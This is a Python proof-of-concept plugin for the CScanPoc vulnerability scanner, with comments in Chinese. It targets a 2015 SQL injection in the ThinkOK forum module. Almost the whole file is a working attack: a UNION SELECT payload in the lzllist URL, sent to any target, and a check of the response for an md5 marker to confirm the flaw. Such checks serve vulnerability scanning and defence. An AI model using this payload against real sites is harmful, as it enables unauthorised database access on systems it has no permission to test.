# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ThinkOX_0007'  # 平台漏洞编号，留空
    name = 'ThinkOK SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-06'  # 漏洞公布时间
    desc = '''
        ThinkOK /index.php?s=/forum/lzl/lzllist/to_f_reply_id/1 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3097/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkOK'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ae153aaa-da88-4a49-8415-8c88525d70e2'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.php?s=/forum/lzl/lzllist/to_f_reply_id/1%20and%201=2)union%20select%201,2,3,4,md5(3.14),6,7,8,9%23.html'
            verify_url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(verify_url)

            if code == 200 and "4beed3b9c4a886067de0e3a094246f78" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
